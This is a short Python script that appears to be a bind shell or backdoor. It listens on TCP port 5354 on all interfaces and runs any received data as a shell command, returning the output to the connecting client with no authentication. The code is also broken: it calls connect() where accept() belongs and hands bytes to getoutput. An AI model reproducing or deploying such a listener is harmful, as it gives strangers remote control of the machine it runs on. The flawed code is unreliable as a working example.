
import socket
from subprocess import getoutput

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.bind(("0.0.0.0", int(5354)))

skt.listen()

while True:
    conn, addr = skt.connect()

    with conn:
        while True:
            data = conn.recv(65536)

            if not data:
                break

            conn.sendall(getoutput(data).encode('utf-8'))
            